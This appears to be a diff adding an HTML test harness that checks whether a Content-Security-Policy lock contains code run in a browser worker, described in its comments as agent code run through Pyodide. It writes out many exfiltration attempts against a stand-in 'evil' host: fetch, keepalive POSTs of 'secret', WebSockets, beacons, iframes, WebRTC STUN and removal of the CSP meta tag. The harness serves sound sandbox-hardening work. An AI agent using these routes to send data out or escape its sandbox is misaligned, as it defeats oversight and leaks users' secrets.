@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' 'wasm-unsafe-eval' blob:; img-src 'self' file: blob: data:; connect-src * blob: data:; worker-src blob:; base-uri 'none'; form-action 'none'">
+<title>CSP attacks</title>
+</head><body>
+<script>
+// Attack code: runs in a worker started after the lock (like agent code via Pyodide's js module).
+const ATTACKS = String.raw`
+async function attempt(name, fn) {
+    try { const v = await Promise.race([fn(), new Promise(r => setTimeout(() => r("timeout"), 4000))]); return [name, String(v)]; }
+    catch (e) { return [name, "throw " + (e && e.name) + ": " + String(e && e.message).slice(0, 120)]; }
+}
+async function attackAll(E, ctx) {
+    const evil = E.evil, q = "?via=" + ctx + "-";
+    const out = [];
+    out.push(await attempt("fetch", () => fetch(evil + "/" + q + "fetch").then(r => "ok " + r.status)));
+    out.push(await attempt("fetch keepalive POST", () => fetch(evil + "/" + q + "keepalive", { method: "POST", body: "secret", keepalive: true }).then(r => "ok " + r.status)));
+    out.push(await attempt("fetch no-cors", () => fetch(evil + "/" + q + "nocors", { mode: "no-cors" }).then(r => "ok " + r.type)));
+    out.push(await attempt("fetch via endpoint redirect", () => fetch(E.endpoint + "/redirect" + q + "redir").then(r => "ok " + r.status + " " + r.url)));
+    out.push(await attempt("xhr sync", () => { const x = new XMLHttpRequest(); x.open("GET", evil + "/" + q + "xhrsync", false); x.send(); return "ok " + x.status; }));
+    out.push(await attempt("WebSocket", () => new Promise(r => { const s = new WebSocket(evil.replace("http", "ws") + "/" + q + "ws"); s.onopen = () => r("open"); s.onerror = () => r("error"); })));
+    out.push(await attempt("EventSource", () => new Promise(r => { const s = new EventSource(evil + "/" + q + "sse"); s.onopen = () => r("open"); s.onerror = () => { s.close(); r("error"); }; })));
+    out.push(await attempt("WebTransport", async () => { if (typeof WebTransport === "undefined") return "n/a"; const t = new WebTransport("https://127.0.0.1:" + E.evilPort + "/" + q + "wt"); await t.ready; return "open"; }));
+    out.push(await attempt("importScripts", () => { importScripts(evil + "/x.js" + q + "importScripts"); return "loaded"; }));
+    out.push(await attempt("dynamic import()", () => import(evil + "/x.mjs" + q + "import").then(() => "loaded")));
+    out.push(await attempt("nested blob Worker -> fetch", () => new Promise(r => {
+        const src = "fetch(" + JSON.stringify(evil + "/" + q + "nested") + ").then(x=>postMessage('ok '+x.status),e=>postMessage('err '+e.message))";
+        const w = new Worker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })));
+        w.onmessage = e => r(e.data); w.onerror = e => r("worker error " + (e.message || ""));
+    })));
+    out.push(await attempt("data: Worker", () => new Promise(r => { const w = new Worker("data:text/javascript,postMessage(1)"); w.onmessage = () => r("ran"); w.onerror = () => r("error"); })));
+    out.push(await attempt("RTCPeerConnection in scope", () => typeof RTCPeerConnection));
+    out.push(await attempt("sendBeacon in scope", () => typeof (self.navigator && navigator.sendBeacon)));
+    out.push(await attempt("pinned CDN path w/ data", () => fetch(E.cdn + "SECRET-" + ctx).then(r => "ok " + r.status)));
+    return out;
+}`;
+</script>
+<script>
+const WORKER_SRC = ATTACKS + `
+self.onmessage = async (ev) => postMessage(await attackAll(ev.data, "worker"));`;
+
+window.runAttacks = async (E) => {
+    const meta = document.createElement("meta");
+    meta.httpEquiv = "Content-Security-Policy";
+    meta.content = "connect-src " + E.allow.join(" ");
+    document.head.appendChild(meta);
+    const w = new Worker(URL.createObjectURL(new Blob([WORKER_SRC], { type: "text/javascript" })));
+    const worker = await new Promise(r => { w.onmessage = e => r(e.data); w.postMessage(E); setTimeout(() => r("worker timeout"), 90000); });
+
+    // Main-thread escape: what agent code could do if it ever ran in the page.
+    const page = [];
+    const att = async (name, fn) => { try { page.push([name, String(await Promise.race([fn(), new Promise(r => setTimeout(() => r("timeout"), 4000))]))]); } catch (e) { page.push([name, "throw " + e.name + ": " + String(e.message).slice(0, 120)]); } };
+    await att("remove the meta, then fetch", async () => { meta.remove(); return fetch(E.evil + "/?via=page-afterremove").then(r => "ok " + r.status); });
+    await att("img beacon", () => new Promise(r => { const i = new Image(); i.onload = () => r("loaded"); i.onerror = () => r("error"); i.src = E.evil + "/?via=page-img"; }));
+    await att("link prefetch", () => new Promise(r => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = E.evil + "/?via=page-prefetch"; l.onload = () => r("loaded"); l.onerror = () => r("error"); document.head.appendChild(l); }));
+    await att("sendBeacon", () => navigator.sendBeacon(E.evil + "/?via=page-beacon", "secret"));
+    await att("iframe", () => new Promise(r => { const f = document.createElement("iframe"); f.src = E.evil + "/?via=page-iframe"; f.onload = () => r("load event"); document.body.appendChild(f); setTimeout(() => r("no load"), 2000); }));
+    await att("WebRTC STUN to evil UDP", async () => {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:" + E.udpPort }] });
+        pc.createDataChannel("x");
+        await pc.setLocalDescription(await pc.createOffer());
+        await new Promise(r => setTimeout(r, 2500));
+        pc.close(); return "offer made";
+    });
+    return { worker, page };
+};
+</script>
+</body></html>
